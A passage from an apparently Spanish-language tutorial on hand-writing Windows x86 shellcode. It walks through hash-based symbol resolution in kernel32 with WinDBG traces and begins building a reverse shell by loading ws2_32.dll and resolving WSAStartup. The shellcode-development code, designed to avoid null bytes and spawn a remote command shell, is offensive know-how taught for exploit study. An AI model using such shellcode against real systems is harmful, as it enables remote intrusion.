</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">exec_shellcode:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null ECX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> uExitCode
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0xffffffff;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> hProcess
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x14];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamada a TerminateProcess
</span></span></code></pre>
<p>Continuemos en WinDBG, pondremos un punto de interrupción en <code>find_function_shorten</code>, un a vez alcanzado daremos el salto y llegaremos a <code>find_function_short</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; bp 00e20023
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
</span><span class="z-text z-plain">eip=00e20023 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00e20023 eb06            jmp     00e2002b
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; t
</span><span class="z-text z-plain">eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
</span><span class="z-text z-plain">eip=00e2002b esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00e2002b e8f5ffffff      call    00e20025
</span><span class="z-text z-plain">
</span></code></pre>
<p>La instrucción <code>call</code> no contiene ningún byte, confirmemos que la dirección de retorno apunta a <code>find_function</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; t
</span><span class="z-text z-plain">eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
</span><span class="z-text z-plain">eip=00e20025 esp=020bfd60 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00e20025 5e              pop     esi
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dd esp l1
</span><span class="z-text z-plain">020bfd60  00e20030
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u 00e20030
</span><span class="z-text z-plain">00e20030 60              pushad
</span><span class="z-text z-plain">00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
</span><span class="z-text z-plain">00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
</span><span class="z-text z-plain">00e20038 01df            add     edi,ebx
</span><span class="z-text z-plain">00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
</span><span class="z-text z-plain">00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
</span><span class="z-text z-plain">00e20040 01d8            add     eax,ebx
</span><span class="z-text z-plain">00e20042 8945fc          mov     dword ptr [ebp-4],eax
</span></code></pre>
<p>Según el snippet anterior, la dirección de retorno se inserta en la pila y apunta a la primera instrucción de <code>find_function</code>. Las dos instrucciones siguientes extraerán la dirección de <code>find_function</code> de ESI y la guardarán en la ubicación de memoria indicada por EBP en el desplazamiento <code>0x04</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
</span><span class="z-text z-plain">eip=00e20026 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00e20026 897504          mov     dword ptr [ebp+4],esi ss:0023:020bff78=00000000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u @esi
</span><span class="z-text z-plain">00e20030 60              pushad
</span><span class="z-text z-plain">00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
</span><span class="z-text z-plain">00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
</span><span class="z-text z-plain">00e20038 01df            add     edi,ebx
</span><span class="z-text z-plain">00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
</span><span class="z-text z-plain">00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
</span><span class="z-text z-plain">00e20040 01d8            add     eax,ebx
</span><span class="z-text z-plain">00e20042 8945fc          mov     dword ptr [ebp-4],eax
</span></code></pre>
<p>Comprobamos que está en <code>ebp-4</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; t
</span><span class="z-text z-plain">eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
</span><span class="z-text z-plain">eip=00e20029 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00e20029 eb54            jmp     00e2007f
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u poi(@ebp + 0x04)
</span><span class="z-text z-plain">00e20030 60              pushad
</span><span class="z-text z-plain">00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
</span><span class="z-text z-plain">00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
</span><span class="z-text z-plain">00e20038 01df            add     edi,ebx
</span><span class="z-text z-plain">00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
</span><span class="z-text z-plain">00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
</span><span class="z-text z-plain">00e20040 01d8            add     eax,ebx
</span><span class="z-text z-plain">00e20042 8945fc          mov     dword ptr [ebp-4],eax
</span></code></pre>
<p>La última instrucción de <code>find_function_ret</code> es un salto corto a la función <code>resolve_symbols_kernel32</code> , donde usamos una llamada indirecta para evitar bytes nulos:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_ret: <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	  <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pop esi; <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Se saca de la pila la direccion de retorno
</span></span><span class="z-source z-python">	  <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x04], esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>          <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guarda la dirección find_function para despues
</span></span><span class="z-source z-python">	  <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jmp resolve_symbols_kernel32;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Salta resolve_symbols_kernel32
</span></span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=76c2a210 ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
</span><span class="z-text z-plain">eip=00e20087 esp=020bfd60 ebp=020bff74 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">00e20087 894514          mov     dword ptr [ebp+14h],eax ss:0023:020bff88=00000000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u @eax
</span><span class="z-text z-plain">KERNEL32!TerminateProcessStub:
</span><span class="z-text z-plain">76c2a210 8bff            mov     edi,edi
</span><span class="z-text z-plain">76c2a212 55              push    ebp
</span><span class="z-text z-plain">76c2a213 8bec            mov     ebp,esp
</span><span class="z-text z-plain">76c2a215 5d              pop     ebp
</span><span class="z-text z-plain">76c2a216 ff2538bac876    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76c8ba38)]
</span><span class="z-text z-plain">76c2a21c cc              int     3
</span><span class="z-text z-plain">76c2a21d cc              int     3
</span><span class="z-text z-plain">76c2a21e cc              int     3
</span></code></pre>
<p>Además, al pasar por alto la llamada, podemos confirmar que nuestro shellcode está funcionando correctamente y podemos recuperar la dirección de memoria virtual de <code>TerminateProcess</code>.</p>
<h2 id="shell-inversa">Shell inversa<a class="zola-anchor" href="#shell-inversa" aria-label="Anchor link for: shell-inversa" style="visibility: hidden;"></a>
</h2>
<p>La mayoría de las API necesarias son exportadas por <code>ws2_32.dll</code>. Primero se debe inicializar la DLL de Winsock usando <code>WSAStartup</code>.</p>
<p>A continuación, se llama a <code>WSASocketA</code> para crear el socket y finalmente a <code>WSAConnect</code> para poder establecer la conexión. Por último se debera invocar a <code>CreateProccesA</code> desde <code>kernel32.dll</code> para poder iniciar un cmd.</p>
<h3 id="carga-de-ws2-32-dll-y-resolucion-de-simbolos">Carga de ws2_32.dll y resolución de símbolos<a class="zola-anchor" href="#carga-de-ws2-32-dll-y-resolucion-de-simbolos" aria-label="Anchor link for: carga-de-ws2-32-dll-y-resolucion-de-simbolos" style="visibility: hidden;"></a>
</h3>
<p>Llegados a este punto, nuestro shellcoe ya puede resolver simbolos de kernel32, por lo que la primera API que necestiamos importar es <code>CreateProcessA</code> y almacenar su dirección para uso posterior.</p>
<p>Primero necesitamos cargar <code>ws2_32.dll</code> en la memoria del shellcode y obtener su dirección base, ambas son exportadas por <code>kernel32.dll</code>, estas tareas se pueden lograr utilizando <code>LoadLibraryA</code>.</p>
<p>Para resolver los símbolos de <code>ws2_32.dll</code>, podríamos usar <code>GetProcAddress</code>, pero también podemos utilizar las funciones ya implementadas.</p>
<p>Lo primordial es que la dirección base del registro esté en EBX, para que podamos convertir la RVA en la VMA.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">LoadLibraryA</span></span> <span class="z-keyword z-operator z-arithmetic z-python">-</span><span class="z-keyword z-operator z-comparison z-python">&gt;</span> <span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>ec0e4e8e</span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">CreateProcessA</span></span> <span class="z-keyword z-operator z-arithmetic z-python">-</span><span class="z-keyword z-operator z-comparison z-python">&gt;</span> <span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>16b3fe72</span>
</span></code></pre>
<p>La función <code>resolve_symbols_kernel32</code>, quedaría de la siguiente forma:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">resolve_symbols_kernel32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x78b5b983;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> TerminateProcess hash
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x04];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar find_function
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x14], eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar la direccion TerminateProcess para despues
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0xec0e4e8e;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> LoadLibraryA hash
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x04];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar a  find_function
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x18], eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar la direccion LoadLibraryA para despues
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x16b3fe72;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> CreateProcessA hash
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x04];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar a find_function
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x1C], eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar la direccion  CreateProcessA address para despues
</span></span></code></pre>
<p>Ahora nuestra función resuelve los dos símbolos de kernel32, <code>LoadLibraryA</code> y <code>CreateProccesA</code>.</p>
<p>Seguido de esto, debemos configurar la llamada a <code>LoadLibraryA</code>:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">load_ws2_32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>               <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ax, 0x6c6c;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve el final de la cadena a AX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                   <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Lanza a EAX a la pila con el terminador nulo
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x642e3233;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Lanza una parte de la cadena a la pila
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x5f327377;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Lanza la otra parte de la cadena a la pila
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                   <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Lanza a ESP para tener el puntero para la cadena
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x18];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llama a LoadLibraryA
</span></span></code></pre>
<p>Primero haremos que EAX valga nulo, luego movemos el final de la cadena de <code>ws2_32.dll</code> a AX y la insertamos en la pila, esto garantiza que nuestra cadena termine en null evitano bytes nulos.</p>
<p>Las dos instrucciones siguiente hace que la cadena completa se inserte en la pila, y después inserta ESP ya que <code>LoadLibraryA</code> requiere un puntero a la cadena que se encuentra actualmente en la pila.</p>
<p>Finalmente llamamos a <code>LoadLibraryA</code> y pasamos a la función <code>resolve_symbols_ws2_32</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">&quot;resolve_symbols_ws2_32:&quot;
</span><span class="z-text z-plain">	&quot;mov ebx, eax;&quot;            # Mueve la dirección base de ws2_32.dll a ebx
</span><span class="z-text z-plain">	&quot;push 0x3bfcedcb;&quot;         # WSAStartup hash
</span><span class="z-text z-plain">	&quot;call dword ptr [ebp+0x04];&quot; # llama a  find_function
</span><span class="z-text z-plain">	&quot;mov [ebp+0x20], eax;&quot;     # Guarda WSAStartup para despues
</span><span class="z-text z-plain">	
</span></code></pre>
<p>Esta función reutiliza nuestra implementación de <code>find_function</code> para resolver símbolos de ws2_32.dll. Pero primero, necesitamos configurar el registro EBX a la dirección base de ws2_32.dll.</p>
<p>El valor de retorno de <strong>LoadLibraryA</strong> es un identificador del módulo especificado como argumento. Este identificador se presenta en forma de la dirección base del módulo. Si la llamada a LoadLibraryA se realiza correctamente, deberíamos tener la dirección base de ws2_32.dll en el registro EAX, lo que nos permitirá moverlo a EBX mediante una simple instrucción <code>mov</code>.</p>
<p>Con la dirección base de ws2_32.dll en EBX, enviamos los hashes individuales para cada símbolo requerido. En nuestro caso, comenzamos con WSAStartup y llamamos a find_function para resolverlos.</p>
<p>Estableceremos un punto de interrupción justo al principio de <code>load_ws2_32.dll</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=769b7570 ebx=76990000 ecx=00000000 edx=01910000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100a0 esp=02f3f5c0 ebp=02f3f7dc iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">019100a0 31c0            xor     eax,eax
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u  019100a0
</span><span class="z-text z-plain">019100a0 31c0            xor     eax,eax
</span><span class="z-text z-plain">019100a2 66b86c6c        mov     ax,6C6Ch
</span><span class="z-text z-plain">019100a6 50              push    eax
</span><span class="z-text z-plain">019100a7 6833322e64      push    642E3233h
</span><span class="z-text z-plain">019100ac 687773325f      push    5F327377h
</span><span class="z-text z-plain">019100b1 54              push    esp
</span><span class="z-text z-plain">019100b2 ff5518          call    dword ptr [ebp+18h]
</span><span class="z-text z-plain">019100b5 89c3            mov     ebx,eax
</span></code></pre>
<p>Continuamos hasta <code>call    dword ptr [ebp+18h]</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=00006c6c ebx=76990000 ecx=00000000 edx=01910000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100b2 esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">019100b2 ff5518          call    dword ptr [ebp+18h]  ss:0023:02f3f7f4={KERNEL32!LoadLibraryAStub (769b9950)}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; da poi(esp)
</span><span class="z-text z-plain">02f3f5b4  &quot;ws2_32.dll&quot;
</span></code></pre>
<p>Pasamos por encima la función y comprobamos que <code>eax</code>, contiene la dirección de inicio de <code>ws2_32.dll</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; u  019100b1
</span><span class="z-text z-plain">019100b1 54              push    esp
</span><span class="z-text z-plain">019100b2 ff5518          call    dword ptr [ebp+18h]
</span><span class="z-text z-plain">019100b5 89c3            mov     ebx,eax
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=77350000 ebx=76990000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100b5 esp=02f3f5b4 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">019100b5 89c3            mov     ebx,eax
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; r eax
</span><span class="z-text z-plain">eax=77350000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; lm m ws2_32
</span><span class="z-text z-plain">Browse full module list
</span><span class="z-text z-plain">start    end        module name
</span><span class="z-text z-plain">77350000 773b3000   WS2_32     (deferred)
</span></code></pre>
<p>Después de pasar por la llamada vemos que el argumento está configurado correctamente antes de la llamada a <code>LoadLibraryA</code>.</p>
<p>Finalmente, debemos asegurarnos de que nuestra implementación de <code>find_function</code> funcione con <code>ws2_32.dll</code>. Repasemos las instrucciones para llegar a la instrucción <code>push</code> que coloca el hash de <code>WSAStartup</code> en la pila y luego llamemos a <code>find_function</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=77350000 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100b7 esp=02f3f5b4 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">019100b7 68cbedfc3b      push    3BFCEDCBh
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=77350000 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100bc esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">019100bc ff5504          call    dword ptr [ebp+4]    ss:0023:02f3f7e0=01910030
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=77359cc0 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
</span><span class="z-text z-plain">eip=019100bf esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl nz na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
</span><span class="z-text z-plain">019100bf 894520          mov     dword ptr [ebp+20h],eax ss:0023:02f3f7fc=00000000
</span><span class="z-text z-plain">0:004&gt; r eax
</span><span class="z-text z-plain">eax=77359cc0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u @eax
</span><span class="z-text z-plain">WS2_32!WSAStartup:
</span><span class="z-text z-plain">77359cc0 8bff            mov     edi,edi
</span><span class="z-text z-plain">77359cc2 55              push    ebp
</span><span class="z-text z-plain">77359cc3 8bec            mov     ebp,esp
</span><span class="z-text z-plain">77359cc5 6afe            push    0FFFFFFFEh
</span><span class="z-text z-plain">77359cc7 68f8363977      push    offset WS2_32!StringCopyWorkerW+0x3b1 (773936f8)
</span><span class="z-text z-plain">77359ccc 68807b3677      push    offset WS2_32!_except_handler4 (77367b80)
</span><span class="z-text z-plain">77359cd1 64a100000000    mov     eax,dword ptr fs:[00000000h]
</span><span class="z-text z-plain">77359cd7 50              push    eax
</span></code></pre>
<p>En el snippet anterior podemos ver como se inserta la dirección en la pila con <code>push</code>, después se recupera la dirección de find_funcion guardada en <code>ebp-4</code> y vemos como <code>eax</code>, contiene la dirección de <code>WSAStartup</code> antes de guardarse.</p>
